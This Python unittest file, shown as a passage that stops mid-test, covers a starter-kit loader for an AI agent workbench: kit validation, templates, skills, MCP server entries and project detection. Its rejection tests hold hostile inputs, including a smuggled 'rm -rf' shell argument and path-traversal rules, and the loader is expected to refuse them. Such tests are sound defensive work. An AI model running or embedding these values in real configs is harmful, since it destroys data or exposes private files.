import atexit
import json
import os
from pathlib import Path
import re
import shutil
import tempfile
import unittest
from unittest.mock import patch

if "WORKBENCH_DATA" not in os.environ:
    os.environ["WORKBENCH_DATA"] = tempfile.mkdtemp(prefix="awb-test-")
    atexit.register(shutil.rmtree, os.environ["WORKBENCH_DATA"], ignore_errors=True)

import yaml

import paths
import project_profiles as projects
import project_setup as setup
import starter_kits as kits

REAL = kits.KITS_DIR
LABELS = {
    "general": ("General software", 10),
    "web": ("Web front end", 40),
    "python-data": ("Python and data", 30),
    "3d": ("3D scenes and assets", 60),
    "research-writing": ("Research and writing", 20),
    "devops": ("DevOps and infrastructure", 50),
    "gamedev": ("Game development", 70),
    "blank": ("Blank", 0),
}
TEMPLATE = """# {{project}}

TODO: one line that says what this project is.

## Commands

- Install: `{{cmd:install}}`
- Run: `{{cmd:dev}}`
- Test everything: `{{cmd:test}}`
- Lint and format: `{{cmd:lint}}`
- Build: `{{cmd:build}}`
- Typecheck: `{{cmd:typecheck}}`

## Boundaries

Never:
- Commit secrets, keys or tokens.
"""
MINIMAL = {
    "schema": 1,
    "id": "demo",
    "label": "Demo",
    "summary": "A kit used by the tests.",
    "works_with": "",
    "version": "0.4.0",
    "priority": 5,
    "detect": {"strong": [{"file": "demo.txt"}], "weak": []},
    "skills": [{"name": "workbench-demo"}],
    "mcp": [
        {
            "name": "notes",
            "label": "Notes",
            "publisher": "Example",
            "source": "https://example.com/notes",
            "license": "MIT",
            "version": "1.0.0",
            "checked": "registry",
            "transport": "stdio",
            "command": "npx",
            "args": ["-y", "notes-mcp@1.0.0"],
            "requires": ["node"],
            "default": True,
            "network": "None.",
            "warning": "",
        }
    ],
}


def skill_text(name, description="Check the thing. Use after any edit.", extra=""):
    return (
        f"---\nname: {name}\ndescription: {description}\nlicense: MIT\n{extra}"
        'metadata:\n  source: agent-workbench\n  version: "0.4.0"\n---\n\n'
        "## Steps\n1. Do the thing.\n"
    )


def write(path, text):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(
        text if isinstance(text, str) else json.dumps(text), encoding="utf8", newline="\n"
    )
    return path


def shipped(kit_id):
    return json.loads((REAL / kit_id / "kit.json").read_text(encoding="utf8"))


def stage(root, kit_id, data=None, template=TEMPLATE, skills=True):
    """A kit folder with kit.json (the shipped one unless data is given) and stand-in prose."""
    data = shipped(kit_id) if data is None else data
    folder = root / kit_id
    write(folder / "kit.json", data)
    if template is not None:
        write(folder / "AGENTS.md", template)
    if skills:
        for skill in data["skills"]:
            name = skill["name"]
            write(folder / "skills" / name / "SKILL.md", skill_text(name))
    return folder


def launch_fields(entry):
    return {key: entry[key] for key in setup.SERVER_KEYS if key in entry}


def front_matter(text):
    lines = text.splitlines()
    end = lines.index("---", 1)
    return yaml.safe_load("\n".join(lines[1:end]))


class ShippedKits(unittest.TestCase):
    def setUp(self):
        kits._catalog.cache_clear()

    def test_shipped_kits_load(self):
        self.assertEqual(tuple(LABELS), kits.ORDER)
        for kit_id, (label, priority) in LABELS.items():
            with self.subTest(kit=kit_id):
                kit = kits.load_kit(kit_id, REAL)
                self.assertEqual(
                    (kit["id"], kit["label"], kit["priority"], kit["version"]),
                    (kit_id, label, priority, "0.4.0"),
                )
                self.assertLessEqual(len(kit["skills"]), 5)
                for entry in kit["mcp"]:
                    if "builtin" in entry:
                        self.assertIn(entry["builtin"], projects.CAPS)
                        continue
                    server = setup.clean_server(entry["name"], launch_fields(entry))
                    self.assertEqual(server["transport"], entry["transport"])
                    self.assertIn(entry["checked"], ("registry", "launched"))
                    self.assertTrue(entry["source"].startswith("https://"))
                    self.assertTrue(entry["network"])
        self.assertEqual([row["id"] for row in kits.kits(REAL)], list(kits.ORDER))
        blank = kits.load_kit("blank", REAL)
        self.assertEqual(
            (blank["skills"], blank["mcp"], blank["detect"]),
            ([], [], {"strong": [], "weak": []}),
        )

    def test_shipped_servers_follow_the_verified_data(self):
        found = {}
        for kit_id in kits.ORDER:
            for entry in shipped(kit_id)["mcp"]:
                if "name" in entry:
                    found.setdefault(entry["name"], (kit_id, entry))
        self.assertNotIn("postgres", found)
        self.assertNotIn("aws-api", found)
        self.assertEqual(
            found["duckdb"][1]["args"],
            ["mcp-server-motherduck@1.1.1", "--db-path", ":memory:", "--read-write"],
        )
        self.assertIn("not read-only", found["duckdb"][1]["warning"])
        self.assertEqual(found["github"][1]["args"][-1], "ghcr.io/github/github-mcp-server:v2.2.0")
        self.assertEqual(found["github"][1]["env_from"], ["GITHUB_PERSONAL_ACCESS_TOKEN"])
        self.assertIn("--allow-private-ips", found["fetch"][1]["warning"])
        self.assertIn("eslint/rewrite", found["eslint"][1]["source"])
        self.assertEqual(found["eslint"][1]["when"], {"glob": "eslint.config.*"})
        self.assertFalse(found["godot"][1]["default"])
        self.assertIn("security fix", found["godot"][1]["warning"])
        for name in ("chrome-devtools", "next-devtools", "mcp-for-unity"):
            self.assertTrue(found[name][1]["env"], name)
        for name, (kit_id, entry) in found.items():
            with self.subTest(server=name):
                self.assertEqual(entry["checked"], "registry")
                if entry["transport"] == "http":
                    self.assertEqual(entry["requires"], [])
                    continue
                tool = {"npx": "node", "uvx": "uv", "docker": "docker"}[entry["command"]]
                self.assertEqual(entry["requires"], [tool])
                pinned = [arg for arg in entry["args"] if entry["version"] in arg]
                self.assertTrue(pinned, "the launch command must pin the stated version")
        for kit_id in ("devops", "gamedev"):
            risky = [
                entry["name"]
                for entry in shipped(kit_id)["mcp"]
                if entry["default"] and "when" not in entry and "name" in entry
            ]
            self.assertEqual(risky, [], kit_id)

    def test_templates_are_portable(self):
        present = [kit_id for kit_id in kits.ORDER if (REAL / kit_id / "AGENTS.md").is_file()]
        if not present:
            self.skipTest("The kit templates are not written yet.")
        with tempfile.TemporaryDirectory(prefix="awb-kit-") as holder:
            work = Path(holder) / "shop"
            work.mkdir()
            for kit_id in present:
                with self.subTest(kit=kit_id):
                    text = (REAL / kit_id / "AGENTS.md").read_text(encoding="utf8")
                    lines = text.splitlines()
                    self.assertFalse([line for line in lines if re.match(r"@\S", line)])
                    for found in re.findall(r"\{\{.*?\}\}", text):
                        self.assertRegex(found, "^" + kits.PLACEHOLDER + "$")
                    if kit_id == "blank":
                        self.assertLessEqual(len(lines), 15)
                    else:
                        self.assertTrue(40 <= len(lines) <= 60, len(lines))
                    filled = kits.fill(text, work)
                    self.assertNotIn("{{", filled)
                    self.assertEqual(setup.portable_issues(filled), [])
                    self.assertTrue(kits.load_kit(kit_id, REAL)["agents_md"])

    def test_skills_follow_the_common_subset(self):
        for kit_id in kits.ORDER:
            listed = shipped(kit_id)["skills"]
            self.assertLessEqual(len(listed), 5, kit_id)
            for skill in listed:
                name = skill["name"]
                with self.subTest(kit=kit_id, skill=name):
                    self.assertRegex(name, r"^workbench-[a-z0-9]+(-[a-z0-9]+)*$")
                    self.assertLessEqual(len(name), 64)
                    file = REAL / kit_id / "skills" / name / "SKILL.md"
                    if not file.is_file():
                        continue
                    meta = front_matter(file.read_text(encoding="utf8"))
                    self.assertEqual(meta["name"], name)
                    self.assertTrue(0 < len(meta["description"]) <= 200)
                    self.assertLessEqual(
                        set(meta), {"name", "description", "license", "compatibility", "metadata"}
                    )
                    self.assertEqual(meta["license"], "MIT")

    def test_every_listed_skill_exists_with_front_matter(self):
        written = [
            kit_id
            for kit_id in kits.ORDER
            if (REAL / kit_id / "AGENTS.md").exists() or (REAL / kit_id / "skills").exists()
        ]
        if not written:
            self.skipTest("The kit templates and skills are not written yet.")
        for kit_id in kits.ORDER:
            kit = kits.load_kit(kit_id, REAL)
            with self.subTest(kit=kit_id):
                self.assertTrue(kit["agents_md"], f"kits/{kit_id}/AGENTS.md is missing")
            for skill in kit["skills"]:
                name = skill["name"]
                with self.subTest(kit=kit_id, skill=name):
                    file = REAL / kit_id / "skills" / name / "SKILL.md"
                    self.assertTrue(file.is_file(), f"{file} is missing")
                    meta = front_matter(file.read_text(encoding="utf8"))
                    self.assertIsInstance(meta, dict, f"{file} has no valid front matter")
                    self.assertEqual(meta["name"], name)
                    self.assertEqual(
                        kit["skill_meta"][name]["description"], meta["description"].strip()
                    )
                    self.assertIn("SKILL.md", kit["skill_files"][name])

    def test_shared_skills_and_servers_match(self):
        servers, skills = {}, {}
        for kit_id in kits.ORDER:
            data = shipped(kit_id)
            for entry in data["mcp"]:
                if "name" in entry:
                    servers.setdefault(entry["name"], []).append(launch_fields(entry))
            for skill in data["skills"]:
                skills.setdefault(skill["name"], []).append(kit_id)
        self.assertGreater(len(servers["context7"]), 1)
        self.assertGreater(len(servers["github"]), 1)
        for name, found in servers.items():
            with self.subTest(server=name):
                self.assertTrue(all(fields == found[0] for fields in found))
        self.assertEqual(skills["workbench-verify-change"], ["general", "web"])
        for name, users in skills.items():
            copies = [
                REAL / kit_id / "skills" / name
                for kit_id in users
                if (REAL / kit_id / "skills" / name).is_dir()
            ]
            for other in copies[1:]:
                with self.subTest(skill=name):
                    first = sorted(
                        p.relative_to(copies[0]) for p in copies[0].rglob("*") if p.is_file()
                    )
                    same = sorted(p.relative_to(other) for p in other.rglob("*") if p.is_file())
                    self.assertEqual(first, same)
                    for rel in first:
                        self.assertEqual((copies[0] / rel).read_bytes(), (other / rel).read_bytes())


class KitCase(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        holder = tempfile.TemporaryDirectory(prefix="awb-kits-")
        cls.addClassCleanup(holder.cleanup)
        cls.staged = paths.canonical(holder.name)
        for kit_id in kits.ORDER:
            stage(cls.staged, kit_id)

    def setUp(self):
        holder = tempfile.TemporaryDirectory(prefix="awb-kit-")
        self.addCleanup(holder.cleanup)
        self.tmp = paths.canonical(holder.name)
        self.data, self.work, self.root = self.tmp / "data", self.tmp / "shop", self.tmp / "kits"
        for folder in (self.data, self.work, self.root):
            folder.mkdir()
        real = setup._ancestors

        def bounded(root):
            return [f for f in real(root) if f == self.tmp or self.tmp in f.parents]

        for item in (
            patch.object(projects, "DATA", self.data),
            patch.object(setup, "_ancestors", side_effect=bounded),
            patch.object(kits, "KITS_DIR", self.staged),
        ):
            item.start()
            self.addCleanup(item.stop)
        kits._catalog.cache_clear()
        self.addCleanup(kits._catalog.cache_clear)

    def folder(self, name, **files):
        made = self.tmp / name
        made.mkdir()
        for rel, text in files.items():
            write(made.joinpath(*rel.split("/")), text)
        return made

    def put(self, rel, text="", root=None):
        return write((root or self.work).joinpath(*rel.split("/")), text)

    def text(self, rel, root=None):
        return (root or self.work).joinpath(*rel.split("/")).read_bytes().decode("utf8")

    def demo(self, **changes):
        return stage(self.root, "demo", json.loads(json.dumps(MINIMAL)) | changes)

    def bad(self, pattern="^kits/demo: "):
        return self.assertRaisesRegex(ValueError, pattern)

    def actions(self, plan):
        return {item["path"]: item["action"] for item in plan["items"]}

    def selected(self, plan, key="servers"):
        return {
            row.get("name") or "builtin:" + row["builtin"] for row in plan[key] if row["selected"]
        }


class Loader(KitCase):
    def test_loader_rejects_bad_kits(self):
        server = MINIMAL["mcp"][0]
        cases = {
            "unknown top-level key": {"author": "someone"},
            "id differs from the folder": {"id": "other"},
            "schema": {"schema": 2},
            "priority": {"priority": 101},
            "version": {"version": "0.4"},
            "long label": {"label": "x" * 61},
            "six skills": {"skills": [{"name": f"workbench-s{n}"} for n in range(6)]},
            "skill name": {"skills": [{"name": "verify-change"}]},
            "skill twice": {"skills": [{"name": "workbench-demo"}] * 2},
            "skill key": {"skills": [{"name": "workbench-demo", "default": True}]},
            "command with a folder": {"mcp": [server | {"command": "./x"}]},
            "checked": {"mcp": [server | {"checked": "tested"}]},
            "shell text": {"mcp": [server | {"args": ["-y", "notes; rm -rf ."]}]},
            "secret in env": {"mcp": [server | {"env": {"API_KEY": "abc"}}]},
            "plain http": {"mcp": [server | {"source": "http://example.com/notes"}]},
            "built-in name": {"mcp": [server | {"name": "search"}]},
            "unknown server key": {"mcp": [server | {"enabled": True}]},
            "missing server key": {"mcp": [{k: v for k, v in server.items() if k != "license"}]},
            "requires": {"mcp": [server | {"requires": ["python"]}]},
            "platforms": {"mcp": [server | {"platforms": ["macos"]}]},
            "default": {"mcp": [server | {"default": "yes"}]},
            "long warning": {"mcp": [server | {"warning": "x" * 201}]},
            "server twice": {"mcp": [server, server]},
            "thirteen servers": {"mcp": [server | {"name": f"s{n}"} for n in range(13)]},
            "unknown built-in": {
                "mcp": [
                    {
                        "builtin": "shell",
                        "label": "x",
                        "default": False,
                        "network": "x",
                        "warning": "",
                    }
                ]
            },
            "built-in with a version": {
                "mcp": [
                    {
                        "builtin": "search",
                        "label": "x",
                        "default": False,
                        "network": "x",
                        "warning": "",
                        "version": "1",
                    }
                ]
            },
            "rule with ..": {"detect": {"strong": [{"file": "../secret"}], "weak": []}},
            "rule from the root": {"detect": {"strong": [{"glob": "/etc/*"}], "weak": []}},
            "rule with a drive": {"detect": {"strong": [{"file": "C:/x"}], "weak": []}},
            "unknown rule": {"detect": {"strong": [{"exists": "x"}], "weak": []}},
            "rule with two kinds": {"detect": {"strong": [{"file": "a", "dir": "b"}], "weak": []}},
            "rule nested too deep": {
                "detect": {"strong": [{"all": [{"any": [{"none": [{"file": "a"}]}]}]}], "weak": []}
            },
            "mostly without share": {
                "detect": {"strong": [{"mostly": [".md"], "min_files": 3}], "weak": []}
            },
            "min_major text": {
                "detect": {"strong": [{"package_dep": ["next"], "min_major": "16"}], "weak": []}
            },
            "too many rules": {
                "detect": {"strong": [{"file": f"f{n}"} for n in range(25)], "weak": []}
            },
            "detect without weak": {"detect": {"strong": []}},
            "when": {"mcp": [server | {"when": {"file": "../x"}}]},
        }
        for label, change in cases.items():
            with self.subTest(case=label):
                shutil.rmtree(self.root / "demo", ignore_errors=True)
                self.demo(**change)
                with self.bad():
                    kits.load_kit("demo", self.root)
        shutil.rmtree(self.root / "demo")
        folder = self.demo()
        self.assertEqual(kits.load_kit("demo", self.root)["id"], "demo")
        write(folder / "skills" / "workbench-demo" / "SKILL.md", skill_text("workbench-other"))
        with self.bad("^kits/demo: skills/workbench-demo/SKILL.md must be named workbench-demo"):
            kits.load_kit("demo", self.root)
        write(folder / "kit.json", "{not json")
        with self.bad("^kits/demo: kit.json is not valid JSON.$"):
            kits.load_kit("demo", self.root)
        (folder / "kit.json").write_bytes(b"\xff\xfe{}")
        with self.bad():
            kits.load_kit("demo", self.root)
        write(folder / "kit.json", ["a list"])
        with self.bad():
            kits.load_kit("demo", self.root)

    def test_kit_id_cannot_escape(self):
        stage(self.tmp, "x", MINIMAL | {"id": "x"})
        for kit_id in ("../x", "a/b", "..", "", "Web", "a\\b", "x" * 33, None, 5, "/etc"):
            with (
                self.subTest(kit=kit_id),
                self.assertRaisesRegex(ValueError, "Choose a starter kit"),
            ):
                kits.load_kit(kit_id, self.root)
        with self.assertRaisesRegex(ValueError, "Choose a starter kit"):
            kits.load_kit("missing", self.root)

    def test_kit_without_prose_still_loads(self):
        stage(self.root, "demo", MINIMAL, template=None, skills=False)
        kit = kits.load_kit("demo", self.root)
        self.assertEqual((kit["agents_md"], kit["skill_files"], kit["skill_meta"]), ("", {}, {}))
        row = kits.kits(self.root)[0]
        self.assertEqual((row["agents_md_lines"], row["skills"]), (0, []))
        self.assertEqual(row["mcp"][0]["summary"], "npx -y notes-mcp@1.0.0")
        with patch.object(kits, "KITS_DIR", self.root):
            plan = kits.plan(self.work, "demo", "Codex")
            self.assertEqual(self.actions(plan), {setup.PROJECT_FILE: "create"})
            self.assertEqual((plan["agents_md"], plan["skills"]), ("", []))
            with self.assertRaisesRegex(ValueError, "does not include workbench-demo"):
                kits.plan(self.work, "demo", "Codex", skills=["workbench-demo"])
        for kit_id in kits.ORDER:
            stage(self.root, kit_id, template=None, skills=False)
        kits._catalog.cache_clear()
        self.assertEqual([row["id"] for row in kits.kits(self.root)], [*kits.ORDER, "demo"])

    def test_skill_file_rules(self):
        folder = self.demo()
        skill = folder / "skills" / "workbench-demo"
        write(skill / "references" / "checks.md", "More detail.\r\n")
        write(skill / ".DS_Store", "ignored")
        kit = kits.load_kit("demo", self.root)
        self.assertEqual(
            sorted(kit["skill_files"]["workbench-demo"]), ["SKILL.md", "references/checks.md"]
        )
        self.assertEqual(
            kit["skill_files"]["workbench-demo"]["references/checks.md"], "More detail.\n"
        )
        self.assertEqual(
            kit["skill_meta"],
            {"workbench-demo": {"description": "Check the thing. Use after any edit."}},
        )

        def broken(label, pattern, change):
            with self.subTest(case=label):
                shutil.rmtree(self.root / "demo")
                made = self.demo() / "skills" / "workbench-demo"
                change(made)
                with self.bad("^kits/demo: skills/" + pattern):
                    kits.load_kit("demo", self.root)

        main = "SKILL.md"
        broken(
            "nine files",
            "workbench-demo holds more than 8",
            lambda s: [write(s / f"n{n}.md", "x") for n in range(8)],
        )
        broken(
            "two levels",
            "workbench-demo/a/b must be a plain file",
            lambda s: write(s / "a" / "b" / "c.md", "x"),
        )
        broken(
            "large file",
            "workbench-demo/big.md is larger than 32 KiB",
            lambda s: write(s / "big.md", "x" * 32769),
        )
        broken(
            "binary file",
            "workbench-demo/logo.png is not UTF-8",
            lambda s: (s / "logo.png").write_bytes(b"\x89PNG\xff"),
        )
        broken(
            "odd name",
            "workbench-demo/my notes.md has a name",
            lambda s: write(s / "my notes.md", "x"),
        )
        broken("no SKILL.md", "workbench-demo has no SKILL.md", lambda s: (s / main).unlink())
        broken(
            "no front matter",
            "workbench-demo/SKILL.md must start with",
            lambda s: write(s / main, "## Steps\n"),
        )
        broken(
            "colon in a plain description",
            "workbench-demo/SKILL.md has front matter that is not valid YAML",
            lambda s: write(
                s / main, skill_text("workbench-demo", "Verify. Use after any edit: run tests.")
            ),
        )
        broken(
            "long description",
            "workbench-demo/SKILL.md needs a description",
            lambda s: write(s / main, skill_text("workbench-demo", "x" * 201)),
        )
        broken(
            "licence",
            "workbench-demo/SKILL.md must say license: MIT",
            lambda s: write(s / main, skill_text("workbench-demo").replace("MIT", "Apache-2.0")),
        )
        broken(
            "harness-only key",
            "workbench-demo/SKILL.md uses the front-matter key allowed-tools",
            lambda s: write(s / main, skill_text("workbench-demo", extra="allowed-tools: Bash\n")),
        )
        broken(
            "long body",
            "workbench-demo/SKILL.md has more than 500 lines",
            lambda s: write(s / main, skill_text("workbench-demo") + "line\n" * 500),
        )
        broken(
            "impossible date",
            "workbench-demo/SKILL.md has front matter that is not valid YAML",
            lambda s: write(
                s / main, skill_text("workbench-demo", extra="compatibility: 2026-02-30\n")
            ),
        )
        with patch.object(yaml, "safe_load", side_effect=RecursionError):
            with self.bad("^kits/demo: skills/workbench-demo/SKILL.md has front matter that is"):
                kits.load_kit("demo", self.root)
            self.assertEqual(kits.kits(self.root), [])
        broken(
            "unlisted folder",
            "workbench-extra is not listed",
            lambda s: write(s.parent / "workbench-extra" / main, skill_text("workbench-extra")),
        )
        shutil.rmtree(self.root / "demo")
        write(
            self.demo() / "skills" / "workbench-demo" / "SKILL.md",
            skill_text(
                "workbench-demo",
                '"Verify. Use after any edit: run tests."',
                "compatibility: Blender\n",
            ),
        )
        self.assertEqual(
            kits.load_kit("demo", self.root)["skill_meta"]["workbench-demo"]["description"],
            "Verify. Use after any edit: run tests.",
        )

    @unittest.skipIf(os.name == "nt", "needs symbolic links")
    def test_linked_skill_files_are_refused(self):
        folder = self.demo()
        secret = write(self.tmp / "secret.md", "private")
        os.symlink(secret, folder / "skills" / "workbench-demo" / "extra.md")
        with self.bad():
            kits.load_kit("demo", self.root)

    def test_template_rules(self):
        for label, text in {
            "import": "# {{project}}\n\n@docs/rules.md\n",
            "unknown placeholder": "# {{project}}\n\n- Deploy: `{{cmd:deploy}}`\n",
            "stray braces": "# {{ project }}\n",
            "empty": " \n",
            "too long": "# {{project}}\n" + "- a rule\n" * 201,
            "too large": "# {{project}}\n" + "x" * 33000 + "\n",
        }.items():
            with self.subTest(case=label):
                shutil.rmtree(self.root / "demo", ignore_errors=True)
                stage(self.root, "demo", MINIMAL, template=text)
                with self.bad("^kits/demo: AGENTS.md "):
                    kits.load_kit("demo", self.root)
        shutil.rmtree(self.root / "demo")
        stage(self.root, "demo", MINIMAL, template=TEMPLATE.replace("\n", "\r\n"))
        self.assertEqual(kits.load_kit("demo", self.root)["agents_md"], TEMPLATE)

    def test_listing_is_ordered_cached_and_skips_broken_kits(self):
        for kit_id in ("web", "general"):
            stage(self.root, kit_id)
        stage(self.root, "zeta", MINIMAL | {"id": "zeta"})
        stage(self.root, "alpha", MINIMAL | {"id": "alpha"})
        stage(self.root, "broken", MINIMAL | {"id": "elsewhere"})
        write(self.root / "README.md", "not a kit")
        (self.root / "empty").mkdir()
        rows = kits.kits(self.root)
        self.assertEqual([row["id"] for row in rows], ["general", "web", "alpha", "zeta"])
        self.assertEqual(
            set(rows[0]),
            {"id", "label", "summary", "works_with", "version", "agents_md_lines", "skills", "mcp"},
        )
        self.assertEqual(rows[0]["agents_md_lines"], len(TEMPLATE.splitlines()))
        self.assertEqual(
            rows[0]["skills"][0],
            {
                "name": "workbench-verify-change",
                "description": "Check the thing. Use after any edit.",
            },
        )
        wanted = {
            "label",
            "publisher",
            "license",
            "version",
            "checked",
            "transport",
            "summary",
            "requires",
            "default",
            "network",
            "warning",
            "source",
            "needs",
        }
        for row in rows:
            for entry in row["mcp"]:
                self.assertEqual(set(entry) - {"name", "builtin"}, wanted)
                self.assertEqual(len(set(entry) & {"name", "builtin"}), 1)
        github = next(entry for entry in rows[0]["mcp"] if entry.get("name") == "github")
        self.assertEqual(github["needs"], ["GITHUB_PERSONAL_ACCESS_TOKEN"])
        self.assertTrue(
            github["summary"].startswith("docker run -i --rm -e GITHUB_PERSONAL_ACCESS_TOKEN ")
        )
        search = next(entry for entry in rows[0]["mcp"] if entry.get("builtin") == "search")
        self.assertEqual(
            (search["transport"], search["checked"], search["summary"]), ("builtin", "", "")
        )
        rows[0]["label"] = "changed by a caller"
        write(self.root / "alpha" / "kit.json", MINIMAL | {"id": "alpha", "label": "Edited"})
        again = kits.kits(self.root)
        self.assertEqual((again[0]["label"], again[2]["label"]), ("General software", "Demo"))
        kits._catalog.cache_clear()
        self.assertEqual(kits.kits(self.root)[2]["label"], "Edited")
        self.assertEqual(kits.kits(self.tmp / "nowhere"), [])

    def test_platforms_hide_entries(self):
        server = MINIMAL["mcp"][0]
        self.demo(
            mcp=[
                server | {"platforms": ["win32"]},
                server | {"name": "other", "platforms": ["darwin", "linux"]},
            ]
        )
        with patch.object(kits, "KITS_DIR", self.root):
            for platform, shown in (("win32", "notes"), ("linux", "other"), ("darwin", "other")):
                kits._catalog.cache_clear()
                with (
                    self.subTest(platform=platform),
                    patch.object(kits, "_platform", return_value=platform),
                ):
                    self.assertEqual([row["name"] for row in kits.kits()[0]["mcp"]], [shown])
                    plan = kits.plan(self.work, "demo", "Codex")
                    self.assertEqual([row["name"] for row in plan["servers"]], [shown])
                    self.assertEqual(self.selected(plan), {shown})
                    hidden = "other" if shown == "notes" else "notes"
                    with self.assertRaisesRegex(ValueError, f"That kit does not include {hidden}."):
                        kits.plan(self.work, "demo", "Codex", servers=[hidden])


class Detection(KitCase):
    def suggested(self, name, **files):
        return kits.detect(self.folder(name, **files))

    def test_detect_table(self):
        react = {"dependencies": {"react": "^19.0.0"}}
        found = self.suggested("godot", **{"project.godot": ""})
        self.assertEqual(found["suggested"], "gamedev")
        self.assertEqual(found["evidence"], {"gamedev": ["found project.godot"]})
        self.assertEqual((found["scanned"], found["truncated"]), (1, False))
        self.assertEqual(self.suggested("blend", **{"scene.blend": ""})["suggested"], "3d")
        found = self.suggested("tf", **{"main.tf": ""})
        self.assertEqual(found["suggested"], "devops")
        self.assertEqual(found["evidence"]["devops"], ["1 file matches *.tf"])
        found = self.suggested(
            "react", **{"package.json": react, "src/App.tsx": "", "src/Nav.tsx": ""}
        )
        self.assertEqual((found["suggested"], found["alternatives"]), ("web", ["general"]))
        self.assertEqual(
            found["evidence"]["web"], ["package.json depends on react", "2 files match *.tsx"]
        )
        self.assertEqual(
            found["evidence"]["general"], ["found package.json", "found the src folder"]
        )
        found = self.suggested("node", **{"package.json": {"dependencies": {"express": "5"}}})
        self.assertEqual((found["suggested"], found["alternatives"]), ("general", []))
        self.assertEqual(self.suggested("py", **{"pyproject.toml": ""})["suggested"], "python-data")
        notes = {f"chapter{n}.md": "" for n in range(5)} | {"refs.bib": ""}
        found = self.suggested("paper", **notes)
        self.assertEqual(found["suggested"], "research-writing")
        self.assertEqual(
            found["evidence"]["research-writing"], ["mostly Markdown and BibTeX files"]
        )
        self.assertEqual(
            self.suggested("docs-in-code", **notes, **{"Makefile": ""})["suggested"], "general"
        )
        found = self.suggested("empty")
        self.assertEqual(
            found,
            {
                "suggested": "blank",
                "alternatives": [],
                "evidence": {},
                "scanned": 0,
                "truncated": False,
            },
        )
        found = self.suggested("go", **{"go.mod": "", "Dockerfile": ""})
        self.assertEqual((found["suggested"], found["alternatives"]), ("general", []))
        self.assertEqual(found["evidence"]["devops"], ["found Dockerfile"])
        self.assertEqual(self.suggested("docker", **{"Dockerfile": ""})["suggested"], "blank")
        self.assertEqual(
            self.suggested("compose", **{"Dockerfile": "", "compose.yaml": ""})["suggested"],
            "devops",
        )
        unity = {
            "ProjectSettings/ProjectVersion.txt": "",
            "Packages/manifest.json": "{}",
            "Assets/Player.prefab": "",
        }
        found = self.suggested("unity", **unity)
        self.assertEqual(found["suggested"], "gamedev")
        self.assertIn("found ProjectSettings/ProjectVersion.txt", found["evidence"]["gamedev"])
        self.assertEqual(
            self.suggested("half-unity", **{"ProjectSettings/ProjectVersion.txt": ""})["suggested"],
            "blank",
        )
        for bad in ("", "relative", None, 5, str(self.tmp / "missing")):
            with self.subTest(folder=bad), self.assertRaises(ValueError):
                kits.detect(bad)

    def test_detect_priority_and_bounds(self):
        react = {"devDependencies": {"react": "19.0.0"}}
        found = self.suggested(
            "game", **{"project.godot": "", "package.json": react, "model.blend": ""}
        )
        self.assertEqual((found["suggested"], found["alternatives"]), ("gamedev", ["3d", "web"]))
        found = self.suggested("game-web", **{"project.godot": "", "package.json": react})
        self.assertEqual(
            (found["suggested"], found["alternatives"]), ("gamedev", ["web", "general"])
        )
        found = self.suggested(
            "vendored",
            **{"node_modules/x/project.godot": "", ".cache/main.tf": "", "build/scene.blend": ""},
        )
        self.assertEqual((found["suggested"], found["evidence"]), ("blank", {}))
        self.assertEqual(self.suggested("deep", **{"a/b/c/main.tf": ""})["suggested"], "blank")
        self.assertEqual(self.suggested("near", **{"a/b/main.tf": ""})["suggested"], "devops")
        found = self.suggested("ci", **{".github/workflows/ci.yml": "", "k8s/app.yaml": ""})
        self.assertEqual(found["suggested"], "devops")
        self.assertEqual(
            found["evidence"]["devops"],
            ["1 file matches .github/workflows/*.yml", "found the k8s folder"],
        )
        crowded = self.folder("crowded", **{f"note{n:02}.txt": "" for n in range(15)})
        with patch.object(kits, "SCAN_CAP", 10):
            found = kits.detect(crowded)
        self.assertEqual((found["scanned"], found["truncated"]), (10, True))
        self.assertEqual(kits.detect(crowded)["truncated"], False)
        nested = self.folder("nested", **{"a/one.txt": "", "b/two.txt": "", "c/main.tf": ""})
        with patch.object(kits, "SCAN_CAP", 4):
            found = kits.detect(nested)
        self.assertEqual((found["suggested"], found["truncated"]), ("blank", True))

    @unittest.skipIf(os.name == "nt", "needs symbolic links")
    def test_scan_follows_no_links(self):
        outside = self.folder("outside", **{"infra/main.tf": "", "scene.blend": ""})
        work = self.folder("linked")
        os.symlink(outside / "infra", work / "infra")
        os.symlink(outside / "scene.blend", work / "scene.blend")
        found = kits.detect(work)
        self.assertEqual((found["suggested"], found["evidence"]), ("blank", {}))

    def test_rules(self):
        def holds(rule, **files):
            holder = tempfile.mkdtemp(dir=self.tmp)
            for rel, text in files.items():
                write(Path(holder).joinpath(*rel.split("/")), text)
            return kits._evidence(rule, kits._scan(paths.canonical(holder)))

        next16 = {"package_dep": ["next"], "min_major": 16}
        self.assertEqual(
            holds(next16, **{"package.json": {"dependencies": {"next": "^16.1.0"}}}),
            "package.json depends on next",
        )
        self.assertEqual(
            holds(next16, **{"package.json": {"devDependencies": {"next": "16"}}}),
            "package.json depends on next",
        )
        for version in ("^15.9.9", "latest", "workspace:*", 16, None):
            self.assertIsNone(
                holds(next16, **{"package.json": {"dependencies": {"next": version}}})
            )
        self.assertIsNotNone(
            holds(next16, **{"package.json": {"dependencies": {"next": "9" * 5000}}})
        )
        for package in (
            "{broken",
            "[]",
            {"dependencies": ["next"]},
            {"scripts": {"next": "x"}},
            "x" * (kits.MAX_PACKAGE + 1),
        ):
            self.assertIsNone(holds({"package_dep": ["next"]}, **{"package.json": package}))
        self.assertIsNone(holds({"package_dep": ["next"]}))
        mostly = {"mostly": [".md", ".TEX"], "share": 0.6, "min_files": 3}
        self.assertEqual(
            holds(mostly, **{"a.MD": "", "b.tex": "", "c.tex": "", "d.py": ""}),
            "mostly LaTeX and Markdown files",
        )
        self.assertIsNone(holds(mostly, **{"a.md": "", "b.md": ""}))
        self.assertIsNone(holds(mostly, **{"a.md": "", "b.md": "", "c.py": "", "d.py": ""}))
        self.assertEqual(
            holds({"glob": "Source/*.Target.cs"}, **{"Source/Game.Target.cs": ""}),
            "1 file matches Source/*.Target.cs",
        )
        self.assertIsNone(holds({"glob": "*.TF"}, **{"main.tf": ""}))
        self.assertIsNone(holds({"file": "src"}, **{"src/a.py": ""}))
        self.assertIsNone(holds({"dir": "Makefile"}, **{"Makefile": ""}))
        self.assertEqual(holds({"any": [{"file": "a"}, {"file": "b"}]}, b=""), "found b")
        self.assertIsNone(holds({"any": [{"file": "a"}, {"file": "b"}]}))
        self.assertEqual(holds({"none": [{"file": "a"}]}), "")
        self.assertIsNone(holds({"none": [{"file": "a"}]}, a=""))
        self.assertEqual(
